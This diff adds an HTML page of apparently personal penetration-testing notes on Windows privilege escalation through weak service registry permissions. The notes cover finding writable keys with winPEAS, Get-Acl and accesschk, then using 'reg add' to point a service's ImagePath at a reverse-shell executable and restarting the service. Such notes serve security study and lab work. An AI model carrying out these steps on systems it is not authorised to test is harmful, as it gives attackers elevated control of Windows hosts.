@@ -1,0 +1,40 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>weak registry permission</title>
+</head><body>Potential Rabbit Hole:<b>&nbsp;<br/>
+</b><b>If you can change a service configuration but can't stop/start the service, you may not be able to escalate privileges<br/>
+</b><br/>
+<b><br/>
+Identification<br/>
+<br/>
+winPEAS<br/>
+</b>search: <b>Looking if you can modify any services registry()</b><br/>
+<br/>
+<br/>
+powershell<br/>
+<br/>
+<b>powershell -exec bypass<br/>
+Get-Acl &lt;registry from winPEAS&gt; | Format-List<br/>
+<br/>
+verify access<br/>
+.\accesschk.exe /accepteula -uvwqk &lt;HKLM\.....&gt;<br/>
+<br/>
+<br/>
+verify start and stop services [IMPORTANT CHECK FIRST]<br/>
+.\accesschk.exe /accepteula -ucqv user &lt;service name&gt;<br/>
+<br/>
+</b><br/>
+<br/>
+<b>Query the Registry</b><br/>
+<br/>
+PS:&gt; reg query &lt;HKLM\...&gt;<br/>
+<br/>
+look at <b>ImagePath</b>&nbsp;or whatever could injectable for reverse shell<br/>
+<br/>
+<b>Update the Registry<br/>
+<br/>
+</b>reg add &lt;HKLM\...&gt; /v ImagePath /t REG_EXPAND_SZ /d &lt;new path shell.exe&gt; /f<br/>
+<br/>
+<b>Restart the service</b></body></html>
